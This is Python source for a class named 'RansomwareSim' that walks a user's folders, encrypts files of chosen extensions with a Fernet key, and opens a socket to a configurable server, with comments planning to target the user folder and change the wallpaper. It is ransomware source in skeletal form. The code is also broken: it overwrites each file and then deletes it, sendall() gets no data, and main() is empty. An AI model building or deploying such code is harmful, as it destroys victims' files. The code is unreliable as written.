import socket
import os
from cryptography.fernet import Fernet

class RansomwareSim:

    def __init__(self, host, port, directory, extensions):
        self.host = host
        self.port = port
        self.directory = directory
        self.extensions = extensions
        self.key = Fernet.generate_key()

    def encrypt_file(self, file_path):
        f = Fernet(self.key)
        with open(file_path, "rb") as file:
            original = file.read()
        encrypted_data = f.encrypt(original)

        encrypted_path = file_path + ".mocklock"
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

        os.remove(file_path)
        return encrypted_path

    def get_username(self):
        try:
            username = os.getlogin()
            return username
        except:
            return "Could not retrieve user"

    def find_and_encrypt(self):
        encrypted_files = []
        for root, _, files in os.walk(self.directory):
            for filename in files:
                file_path = os.path.join(root, filename)
                if os.path.isfile(file_path) and file_path.endswith(tuple(self.extensions)):
                    encrypted_file_path = self.encrypt_file(file_path)
                    encrypted_files.append(encrypted_file_path)
        return encrypted_files
                
    def server_connect(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect(self.host, self.port)
        server_socket.sendall()

def main():
    # define directory, want to target user folder
    # define wallpaper
    # define extensions
    # define server port
    # define IP addr
    
if __name__ == "__main__":
    main()
